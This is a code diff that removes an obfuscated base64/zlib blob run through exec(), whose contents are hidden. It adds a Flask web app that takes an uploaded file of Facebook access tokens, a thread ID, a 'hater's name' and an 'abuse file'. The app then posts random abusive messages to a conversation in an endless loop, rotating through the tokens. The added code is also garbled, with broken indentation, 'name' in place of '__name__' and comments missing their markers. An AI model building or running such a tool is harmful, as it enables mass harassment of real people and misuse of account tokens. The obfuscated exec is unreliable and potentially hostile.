@@ -1,3 +1,739 @@
-#ENCRYPTED BY : TRICKER S33R9T BRAND
- # Github : https://github.com/seeratwargi
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+from flask import Flask, request, render_template_string, abort
+
+import requests
+
+import random
+
+import time
+
+app = Flask(name)
+
+
+
+Define your Facebook API endpoint and headers
+
+API_URL = 'https://graph.facebook.com/v15.0/'
+
+HEADERS = {
+
+'Connection': 'keep-alive',
+
+'Cache-Control': 'max-age=0',
+
+'Upgrade-Insecure-Requests': '1',
+
+'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+
+'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
+
+'Accept-Encoding': 'gzip, deflate',
+
+'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+
+'referer': 'www.google.com'
+
+}
+
+Define a function to send messages to Facebook conversations
+
+def send_messages(access_tokens, thread_id, hater_name, messages, delay):
+
+while True:
+
+for token in access_tokens:
+
+
+
+
+
+
+
+       try:
+
+
+
+
+
+
+
+           random_message = random.choice(messages).strip()
+
+
+
+
+
+
+
+           message_text = f'{hater_name} {random_message}'
+
+
+
+
+
+
+
+           parameters = {'access_token': token, 'message': message_text}
+
+
+
+
+
+
+
+           response = requests.post(f'{API_URL}t_{thread_id}/', data=parameters, headers=HEADERS)
+
+
+
+
+
+
+
+           if response.status_code == 200:
+
+
+
+
+
+
+
+               print(f"Message sent using token {token}: {message_text}")
+
+
+
+
+
+
+
+           else:
+
+
+
+
+
+
+
+               print(f"Failed to send message using token {token}: {message_text}")
+
+
+
+
+
+
+
+       except Exception as e:
+
+
+
+
+
+
+
+           print(f"Error while sending message using token {token}: {message_text}")
+
+
+
+
+
+
+
+           print(e)
+
+
+
+
+
+
+
+       time.sleep(delay)
+
+@app.route('/', methods=['GET', 'POST'])
+
+def home():
+
+if request.method == 'POST':
+
+access_tokens_file = request.files['tokensFile']
+
+
+
+
+
+
+
+   access_tokens = access_tokens_file.read().decode().splitlines()
+
+
+
+
+
+
+
+   thread_id = request.form.get('threadId')
+
+
+
+
+
+
+
+   hater_name = request.form.get('haterName')
+
+
+
+
+
+
+
+   txt_file = request.files['txtFile']
+
+
+
+
+
+
+
+   delay = int(request.form.get('time'))
+
+
+
+
+
+
+
+   messages = txt_file.read().decode().splitlines()
+
+
+
+
+
+
+
+   send_messages(access_tokens, thread_id, hater_name, messages, delay)
+
+return render_template_string('''
+
+<!DOCTYPE html><html lang="en"><head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1.0">   <title>Anvi | Ofline</title><link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">   <style>
+  
+
+  
+
+  
+
+  
+       .container {
+  
+    max-width: 500px;
+  
+    background: linear-gradient(135deg, #ff69b4, #6a0dad);
+  
+    border-radius: 10px;
+  
+    padding: 20px;
+  
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  
+    margin: 0 auto;
+  
+    margin-top: 20px;
+  
+}
+  
+
+  
+
+  
+body {
+  
+    margin: 0;
+  
+    padding: 0;
+  
+    height: 100vh;
+  
+    background: linear-gradient(-45deg, #000000, #4b0082, #8a2be2);
+  
+    background-size: 400% 400%;
+  
+    animation: gradientBG 10s ease infinite;
+  
+}
+  
+
+  
+/* Gradient Animation Keyframes */
+  
+@keyframes gradientBG {
+  
+    0% { background-position: 0% 50%; }
+  
+    50% { background-position: 100% 50%; }
+  
+    100% { background-position: 0% 50%; }
+  
+}
+  
+
+  
+
+  
+
+  
+
+  
+      .header h1 {
+  
+    text-align: center;
+  
+    margin-bottom: 20px;
+  
+    color: #ffffff; /* white text */
+  
+    text-shadow: 2px 2px 8px rgba(255, 105, 180, 0.7); /* pink glow */
+  
+}
+  
+
+  
+
+  
+
+  
+
+  
+       .header img {
+  
+
+  
+
+  
+
+  
+           max-width: 100px; /* Adjust as needed */
+  
+
+  
+
+  
+
+  
+           margin-right: 100px;
+  
+
+  
+
+  
+
+  
+       }
+  
+
+  
+
+  
+
+  
+       .random-img {
+  
+
+  
+
+  
+
+  
+           max-width: 300px; /* Adjust image size as needed */
+  
+
+  
+
+  
+
+  
+           margin: 100px;
+  
+
+  
+
+  
+
+  
+       }
+  
+
+  
+
+  
+
+  
+       /* Add more CSS styles for other elements as needed */
+  
+
+  
+
+  
+
+  
+       /* For example, you can use classes to style form elements and buttons */
+  
+
+  
+/* Common input styling */
+  
+input[type="text"],
+  
+input[type="number"],
+  
+textarea {
+  
+    width: 100%;
+  
+    padding: 12px;
+  
+    margin-bottom: 15px;
+  
+    border: 2px solid transparent;
+  
+    border-radius: 8px;
+  
+    box-sizing: border-box;
+  
+    background: rgba(255, 255, 255, 0.1); /* glassmorphism effect */
+  
+    color: #fff;
+  
+    font-size: 16px;
+  
+    outline: none;
+  
+    transition: all 0.4s ease;
+  
+}
+  
+
+  
+/* Gradient border and glow on focus */
+  
+input[type="text"]:focus,
+  
+input[type="number"]:focus,
+  
+textarea:focus {
+  
+    border-image: linear-gradient(90deg, #ff69b4, #6a0dad) 1;
+  
+    border-width: 2px;
+  
+    background: rgba(255, 255, 255, 0.15);
+  
+    box-shadow: 0 0 12px rgba(255, 105, 180, 0.8), 0 0 20px rgba(106, 13, 173, 0.7);
+  
+}
+  
+
+  
+/* For .form-control class */
+  
+.form-control {
+  
+    width: 100%;
+  
+    padding: 12px;
+  
+    margin-bottom: 15px;
+  
+    border: 2px solid transparent;
+  
+    border-radius: 8px;
+  
+    background: rgba(255, 255, 255, 0.1);
+  
+    color: #fff;
+  
+    font-size: 16px;
+  
+    transition: all 0.4s ease;
+  
+}
+  
+
+  
+.form-control:focus {
+  
+    border-image: linear-gradient(90deg, #ff69b4, #6a0dad) 1;
+  
+    box-shadow: 0 0 12px rgba(255, 105, 180, 0.8), 0 0 20px rgba(106, 13, 173, 0.7);
+  
+}
+  
+
+  
+     
+  
+input[type="submit"] {
+  
+    width: 100%;
+  
+    padding: 12px;
+  
+    font-size: 16px;
+  
+    font-weight: bold;
+  
+    color: #fff;
+  
+    border: none;
+  
+    border-radius: 8px;
+  
+    cursor: pointer;
+  
+    background: linear-gradient(90deg, #ff69b4, #6a0dad);
+  
+    box-shadow: 0 0 10px rgba(255, 105, 180, 0.6), 0 0 20px rgba(106, 13, 173, 0.5);
+  
+    transition: all 0.4s ease;
+  
+}
+  
+
+  
+/* Hover effect with shine */
+  
+input[type="submit"]:hover {
+  
+    background: linear-gradient(90deg, #6a0dad, #ff69b4);
+  
+    box-shadow: 0 0 15px rgba(255, 105, 180, 0.9), 0 0 25px rgba(106, 13, 173, 0.8);
+  
+    transform: scale(1.05);
+  
+}
+  
+
+  
+.footer {
+  
+
+  
+         
+  
+margin-top: 20px;
+  
+
+  
+          color: #fff;
+  
+
+  
+           text-align: center;
+  
+
+  
+           padding: 20px;
+  
+
+  
+           bottom: 0;
+  
+
+  
+           left: 0;
+  
+
+  
+           width: 100%;
+  
+     }
+  
+
+  
+       .btn-submit {
+  
+
+  
+
+  
+
+  
+           
+  
+
+  
+width: 100%;
+  
+margin-top: 10px;
+  
+
+  
+           color: white;
+  
+
+  
+
+  
+
+  
+           padding: 10px 20px;
+  
+
+  
+
+  
+
+  
+           border: none;
+  
+
+  
+
+  
+
+  
+           cursor: pointer;
+  
+
+  
+
+  
+
+  
+       }
+  
+     
+  
+     input[type="submit"]:hover {
+  
+
+  
+           background-color: #0056b3;
+  
+       
+  
+     }
+  
+     
+  
+     
+  
+.image-container img {
+  
+
+  
+           max-width: 100%;
+  
+
+  
+           height: auto;
+  
+
+  
+           display: block;
+  
+
+  
+           margin: 0 auto;
+  
+
+  
+       }
+  
+     .whatsapp-link {
+  
+display: inline-block;
+  
+
+  
+   color: #25d366;
+  
+
+  
+   text-decoration: none;
+  
+
+  
+   margin-top: 10px;
+  
+     }
+  
+.whatsapp-link i {
+  
+
+  
+   margin-right: 5px;
+  
+     }
+  
+   </style></head><body><header class="header mt-4"><div class="container">
+
+    <div class="image-container"> <img src="https://i.imgur.com/MjbRl4m.png" alt="Image">
+
+        <h1 class="mt-3" style="font-size: 2.5rem; font-weight: bold; color: #fff; text-shadow: 0 0 10px #ff69b4, 0 0 20px #6a0dad;">
+
+            Anvi (XD)
+
+        </h1>
+
+    </div>
+
+</div>
+
+</header>   <div class="container"><form action="/" method="post" enctype="multipart/form-data">
+
+
+
+
+
+
+
+       <div class="mb-3">
+
+<div class="mb-3"><label for="tokensFile" style="color: blue;">
+
+    <i class="fa-solid fa-file-upload"></i> Upload Your Tokens File:
+
+</label>
+
+<input type="file" class="form-control" id="tokensFile" name="tokensFile" required>
+
+</div><div class="mb-3"><label for="threadId" style="color: black;">
+
+    <i class="fa-solid fa-hashtag"></i> Thread ID:
+
+</label>
+
+<input type="text" class="form-control" id="threadId" name="threadId" required>
+
+</div><div class="mb-3"><label for="haterName" style="color: black;">
+
+    <i class="fa-solid fa-user-slash"></i> Hater's Name:
+
+</label>
+
+<input type="text" class="form-control" id="haterName" name="haterName" required>
+
+</div><div class="mb-3"><label for="txtFile" style="color: black;">
+
+    <i class="fa-solid fa-file-lines"></i> Upload Abuse File:
+
+</label>
+
+<input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
+
+</div><div class="mb-3"><label for="time" style="color: black;">
+
+    <i class="fa-solid fa-clock"></i> Delay:
+
+</label>
+
+<input type="number" class="form-control" id="time" name="time" required>
+
+</div><button type="submit" class="btn btn-primary btn-submit"><i class="fa-solid fa-play"></i> Thread Start
+
+</button></form>
+
+   </div><footer class="footer"><p>© 2025 All Rights Reserved | <span>Anvi Private Server</span></p>
+
+</footer></body></html>''')
+
+if name == 'main':
+
+app.run(host='0.0.0.0', port=5000)
